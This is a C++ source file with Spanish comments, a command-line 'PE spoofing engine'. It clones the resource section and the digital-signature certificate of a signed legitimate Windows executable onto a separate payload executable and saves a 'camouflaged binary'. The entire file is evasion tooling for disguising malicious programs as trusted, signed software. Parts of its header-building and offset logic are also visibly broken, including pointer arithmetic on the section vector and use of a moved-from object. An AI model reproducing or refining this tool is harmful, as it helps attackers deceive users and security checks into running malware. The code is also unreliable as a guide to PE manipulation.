/*
 * PE_Spoofing_Engine.cpp - Clonador de Recursos y Firma Digital (Spoofing de
 * Firmas) Lenguaje: C++ Moderno (C++17) con intrínsecos SSE2/AVX2
 *
 * Funcionalidad:
 *   1. Detecta automáticamente PE32/PE64 y aplica las estructuras adecuadas.
 *   2. Clona la sección .rsrc de un binario legítimo al payload.
 *   3. Copia la tabla de certificado (overlay) con alineación correcta.
 *   4. Modifica los Data Directories y encabezados PE con optimización de
 * memoria y rendimiento.
 *   5. Diseño orientado a objetos con principios SOLID y Clean Code.
 */

#define WIN32_LEAN_AND_MEAN
#include <intrin.h> // Para intrínsecos SSE2/AVX2
#include <memory>   // Para RAII
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector> // Para colecciones dinámicas
#include <windows.h>

// --- ENUMERACIONES Y TIPOS ---
enum class PEArchitecture { UNKNOWN, PE32, PE64 };
using PEHandle = std::unique_ptr<void, decltype(&CloseHandle)>;

class PEMemoryManager {
public:
  static std::unique_ptr<std::vector<uint8_t>>
  ReadFileToBuffer(const std::string &path) {
    HANDLE hFile =
        CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
      return nullptr;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
      CloseHandle(hFile);
      return nullptr;
    }

    auto buffer = std::make_unique<std::vector<uint8_t>>(size);
    DWORD read;
    BOOL success = ReadFile(hFile, buffer->data(), size, &read, NULL);
    CloseHandle(hFile);

    if (!success || read != size) {
      return nullptr;
    }
    return buffer;
  }

  static bool WriteBufferToFile(const std::string &path,
                                const std::vector<uint8_t> &buffer) {
    HANDLE hOut = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
      return false;

    DWORD written;
    BOOL success = WriteFile(hOut, buffer.data(),
                             static_cast<DWORD>(buffer.size()), &written, NULL);
    CloseHandle(hOut);
    return success && written == buffer.size();
  }
};

class PEAnalyzer {
public:
  static PEArchitecture GetArchitecture(const uint8_t *base) {
    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER *>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
      return PEArchitecture::UNKNOWN;

    auto nt32 =
        reinterpret_cast<const IMAGE_NT_HEADERS32 *>(base + dos->e_lfanew);
    if (nt32->Signature != IMAGE_NT_SIGNATURE)
      return PEArchitecture::UNKNOWN;

    WORD magic = nt32->OptionalHeader.Magic;
    if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
      return PEArchitecture::PE32;
    else if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
      return PEArchitecture::PE64;
    else
      return PEArchitecture::UNKNOWN;
  }

  static const IMAGE_SECTION_HEADER *
  FindSectionByName(const uint8_t *base, const std::string &name) {
    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER *>(base);
    auto nt32 =
        reinterpret_cast<const IMAGE_NT_HEADERS32 *>(base + dos->e_lfanew);

    DWORD num_sections = nt32->FileHeader.NumberOfSections;
    auto sec = IMAGE_FIRST_SECTION(nt32);

    for (DWORD i = 0; i < num_sections; i++, sec++) {
      if (strncmp(reinterpret_cast<const char *>(sec->Name), name.c_str(), 8) ==
          0) {
        return sec;
      }
    }
    return nullptr;
  }
};

class PEMemoryCopier {
public:
  static void Copy(void *dest, const void *src, size_t size) {
    char *d = static_cast<char *>(dest);
    const char *s = static_cast<const char *>(src);

#ifdef __AVX2__
    while (size >= 32) {
      __m256i chunk = _mm256_loadu_si256(reinterpret_cast<const __m256i *>(s));
      _mm256_storeu_si256(reinterpret_cast<__m256i *>(d), chunk);
      d += 32;
      s += 32;
      size -= 32;
    }
#endif

    while (size >= 16) {
      __m128i chunk = _mm_loadu_si128(reinterpret_cast<const __m128i *>(s));
      _mm_storeu_si128(reinterpret_cast<__m128i *>(d), chunk);
      d += 16;
      s += 16;
      size -= 16;
    }

    while (size--) {
      *d++ = *s++;
    }
  }
};

class PEBuilder {
private:
  struct SectionInfo {
    IMAGE_SECTION_HEADER header;
    std::vector<uint8_t> rawData;
  };

  PEArchitecture arch_;
  IMAGE_DOS_HEADER dos_header_;
  std::vector<uint8_t> optional_header_data_;
  std::vector<SectionInfo> sections_;
  std::vector<uint8_t> resource_data_;
  std::vector<uint8_t> certificate_data_;

public:
  explicit PEBuilder(const std::vector<uint8_t> &original_buffer) {
    LoadFromBuffer(original_buffer);
  }

  void LoadFromBuffer(const std::vector<uint8_t> &buffer) {
    auto base = buffer.data();
    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER *>(base);
    auto nt32 =
        reinterpret_cast<const IMAGE_NT_HEADERS32 *>(base + dos->e_lfanew);

    arch_ = PEAnalyzer::GetArchitecture(base);
    dos_header_ = *dos;

    if (arch_ == PEArchitecture::PE64) {
      auto nt64 =
          reinterpret_cast<const IMAGE_NT_HEADERS64 *>(base + dos->e_lfanew);
      optional_header_data_.assign(
          reinterpret_cast<const uint8_t *>(&nt64->OptionalHeader),
          reinterpret_cast<const uint8_t *>(&nt64->OptionalHeader) +
              sizeof(nt64->OptionalHeader));
    } else { // PE32
      optional_header_data_.assign(
          reinterpret_cast<const uint8_t *>(&nt32->OptionalHeader),
          reinterpret_cast<const uint8_t *>(&nt32->OptionalHeader) +
              sizeof(nt32->OptionalHeader));
    }

    DWORD num_sections = nt32->FileHeader.NumberOfSections;
    auto sec = IMAGE_FIRST_SECTION(nt32);
    for (DWORD i = 0; i < num_sections; i++, sec++) {
      SectionInfo info;
      info.header = *sec;
      if (sec->SizeOfRawData > 0) {
        info.rawData.assign(buffer.begin() + sec->PointerToRawData,
                            buffer.begin() + sec->PointerToRawData +
                                sec->SizeOfRawData);
      }
      sections_.push_back(std::move(info));
    }
  }

  void AddResourceSection(const std::vector<uint8_t> &rsrc_data) {
    if (rsrc_data.empty())
      return;

    SectionInfo new_sec;
    memset(&new_sec.header, 0, sizeof(IMAGE_SECTION_HEADER));
    strncpy_s(reinterpret_cast<char *>(new_sec.header.Name), 8, ".rsrc",
              _TRUNCATE);

    DWORD last_va = 0, last_vs = 0;
    if (!sections_.empty()) {
      auto &last = sections_.back();
      last_va = last.header.VirtualAddress;
      last_vs = last.header.Misc.VirtualSize;
    }
    DWORD section_alignment = GetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, SectionAlignment));
    new_sec.header.VirtualAddress =
        AlignValue(last_va + last_vs, section_alignment);
    new_sec.header.Misc.VirtualSize = static_cast<DWORD>(rsrc_data.size());

    DWORD file_alignment = GetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, FileAlignment));
    new_sec.header.SizeOfRawData =
        AlignValue(static_cast<DWORD>(rsrc_data.size()), file_alignment);
    new_sec.header.PointerToRawData =
        CalculateNewRawDataOffset(); // Placeholder
    new_sec.header.Characteristics =
        0x40000040; // INITIALIZED_DATA | MEM_READ | DISCARDABLE

    resource_data_ = rsrc_data;
    sections_.push_back(std::move(new_sec));

    // Update SizeOfImage
    SetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, SizeOfImage),
        AlignValue(new_sec.header.VirtualAddress +
                       new_sec.header.Misc.VirtualSize,
                   section_alignment));
    // Update Resource Directory
    SetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, DataDirectory) +
            IMAGE_DIRECTORY_ENTRY_RESOURCE * sizeof(IMAGE_DATA_DIRECTORY),
        new_sec.header.VirtualAddress);
    SetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, DataDirectory) +
            IMAGE_DIRECTORY_ENTRY_RESOURCE * sizeof(IMAGE_DATA_DIRECTORY) +
            sizeof(DWORD),
        static_cast<DWORD>(rsrc_data.size()));
  }

  void AddCertificate(const std::vector<uint8_t> &cert_data) {
    if (cert_data.empty())
      return;
    certificate_data_ = cert_data;

    DWORD overlay_offset = CalculateOverlayOffset();
    // Ensure 8-byte alignment for security directory
    overlay_offset = AlignValue(overlay_offset, 8);

    SetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, DataDirectory) +
            IMAGE_DIRECTORY_ENTRY_SECURITY * sizeof(IMAGE_DATA_DIRECTORY),
        overlay_offset); // This is a file offset for security dir
    SetOptionalHeaderField<DWORD>(
        offsetof(IMAGE_OPTIONAL_HEADER32, DataDirectory) +
            IMAGE_DIRECTORY_ENTRY_SECURITY * sizeof(IMAGE_DATA_DIRECTORY) +
            sizeof(DWORD),
        static_cast<DWORD>(cert_data.size()));
  }

  std::vector<uint8_t> Build() {
    std::vector<uint8_t> final_buffer;
    DWORD total_size = CalculateFinalSize();
    final_buffer.resize(total_size);

    // Copy DOS Header
    memcpy(final_buffer.data(), &dos_header_, sizeof(dos_header_));

    // Copy NT Headers (DOS + NT + Optional + Sections Table)
    DWORD nt_headers_size =
        sizeof(IMAGE_DOS_HEADER) + sizeof(DWORD) +
        (arch_ == PEArchitecture::PE64
             ? sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER64)
             : sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER32));
    auto nt_dest = final_buffer.data() + dos_header_.e_lfanew;
    memcpy(nt_dest,
           reinterpret_cast<const uint8_t *>(sections_.data()) -
               (sizeof(IMAGE_FILE_HEADER) + optional_header_data_.size()),
           nt_headers_size);

    // Update Number Of Sections in File Header
    auto file_header =
        reinterpret_cast<IMAGE_FILE_HEADER *>(nt_dest + sizeof(DWORD));
    file_header->NumberOfSections = static_cast<WORD>(sections_.size());

    // Copy Optional Header
    memcpy(nt_dest + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER),
           optional_header_data_.data(), optional_header_data_.size());

    // Copy Section Headers
    auto section_table_start =
        nt_dest + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
        (arch_ == PEArchitecture::PE64 ? sizeof(IMAGE_OPTIONAL_HEADER64)
                                       : sizeof(IMAGE_OPTIONAL_HEADER32));
    for (size_t i = 0; i < sections_.size(); ++i) {
      memcpy(section_table_start + i * sizeof(IMAGE_SECTION_HEADER),
             &sections_[i].header, sizeof(IMAGE_SECTION_HEADER));
    }

    // Copy Raw Data for all sections
    for (auto &sec_info : sections_) {
      if (!sec_info.rawData.empty()) {
        PEMemoryCopier::Copy(final_buffer.data() +
                                 sec_info.header.PointerToRawData,
                             sec_info.rawData.data(), sec_info.rawData.size());
      }
    }
    // Copy resource data if present
    if (!resource_data_.empty()) {
      auto &rsrc_sec = sections_.back(); // Assuming it's the last one added
      PEMemoryCopier::Copy(final_buffer.data() +
                               rsrc_sec.header.PointerToRawData,
                           resource_data_.data(), resource_data_.size());
    }
    // Copy certificate data if present
    if (!certificate_data_.empty()) {
      DWORD cert_off = GetOptionalHeaderField<DWORD>(
          offsetof(IMAGE_OPTIONAL_HEADER32, DataDirectory) +
          IMAGE_DIRECTORY_ENTRY_SECURITY * sizeof(IMAGE_DATA_DIRECTORY));
      PEMemoryCopier::Copy(final_buffer.data() + cert_off,
                           certificate_data_.data(), certificate_data_.size());
    }

    return final_buffer;
  }

private:
  DWORD AlignValue(DWORD value, DWORD alignment) {
    DWORD mask = alignment - 1;
    return (value + mask) & (~mask);
  }

  template <typename T> T GetOptionalHeaderField(size_t offset) {
    if (offset + sizeof(T) <= optional_header_data_.size()) {
      return *reinterpret_cast<const T *>(optional_header_data_.data() +
                                          offset);
    }
    return T{}; // Return default constructed value on error
  }

  template <typename T> void SetOptionalHeaderField(size_t offset, T value) {
    if (offset + sizeof(T) <= optional_header_data_.size()) {
      *reinterpret_cast<T *>(
          const_cast<uint8_t *>(optional_header_data_.data() + offset)) = value;
    }
  }

  DWORD CalculateNewRawDataOffset() {
    if (sections_.empty())
      return 0;
    auto &last = sections_[sections_.size() -
                           2]; // Second to last, as we are adding a new one
    return last.header.PointerToRawData + last.header.SizeOfRawData;
  }

  DWORD CalculateOverlayOffset() {
    if (sections_.empty())
      return 0;
    auto &last = sections_.back();
    return last.header.PointerToRawData + last.header.SizeOfRawData;
  }

  DWORD CalculateFinalSize() {
    DWORD max_raw_end = 0;
    for (auto &sec : sections_) {
      DWORD sec_end = sec.header.PointerToRawData + sec.header.SizeOfRawData;
      if (sec_end > max_raw_end)
        max_raw_end = sec_end;
    }

    DWORD cert_offset = AlignValue(max_raw_end, 8);
    DWORD cert_size_aligned =
        AlignValue(static_cast<DWORD>(certificate_data_.size()), 8);
    return cert_offset + cert_size_aligned;
  }
};

int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Uso: %s <origen_firmado.exe> <payload.exe> <salida.exe>\n",
           argv[0]);
    return 1;
  }

  auto src_buffer = PEMemoryManager::ReadFileToBuffer(argv[1]);
  auto dst_buffer = PEMemoryManager::ReadFileToBuffer(argv[2]);

  if (!src_buffer || !dst_buffer) {
    printf("Error al leer los archivos.\n");
    return 1;
  }

  auto src_arch = PEAnalyzer::GetArchitecture(src_buffer->data());
  auto dst_arch = PEAnalyzer::GetArchitecture(dst_buffer->data());

  if (src_arch != dst_arch || src_arch == PEArchitecture::UNKNOWN) {
    printf("Archivos PE no válidos o no coincidentes.\n");
    return 1;
  }

  const IMAGE_SECTION_HEADER *src_rsrc =
      PEAnalyzer::FindSectionByName(src_buffer->data(), ".rsrc");

  std::vector<uint8_t> rsrc_data;
  if (src_rsrc) {
    rsrc_data.assign(src_buffer->begin() + src_rsrc->PointerToRawData,
                     src_buffer->begin() + src_rsrc->PointerToRawData +
                         src_rsrc->SizeOfRawData);
    printf("[*] Recursos clonados: %zu bytes\n", rsrc_data.size());
  } else {
    printf("[!] El origen no tiene sección .rsrc. Se omitirá la clonación.\n");
  }

  // Extract certificate from source
  std::vector<uint8_t> cert_data;
  auto src_dos = reinterpret_cast<const IMAGE_DOS_HEADER *>(src_buffer->data());
  auto src_nt32 = reinterpret_cast<const IMAGE_NT_HEADERS32 *>(
      src_buffer->data() + src_dos->e_lfanew);
  auto &sec_dir =
      src_nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
  if (sec_dir.VirtualAddress != 0 && sec_dir.Size != 0) {
    cert_data.assign(src_buffer->begin() + sec_dir.VirtualAddress,
                     src_buffer->begin() + sec_dir.VirtualAddress +
                         sec_dir.Size);
    printf("[*] Certificado copiado: size=%zu\n", cert_data.size());
  } else {
    printf("[!] El origen no tiene firma digital.\n");
  }

  PEBuilder builder(*dst_buffer);
  builder.AddResourceSection(rsrc_data);
  builder.AddCertificate(cert_data);
  auto final_buffer = builder.Build();

  if (PEMemoryManager::WriteBufferToFile(std::string(argv[3]), final_buffer)) {
    printf("[+] Binario camuflado guardado como: %s\n", argv[3]);
  } else {
    printf("Error al escribir el archivo de salida.\n");
    return 1;
  }

  return 0;
}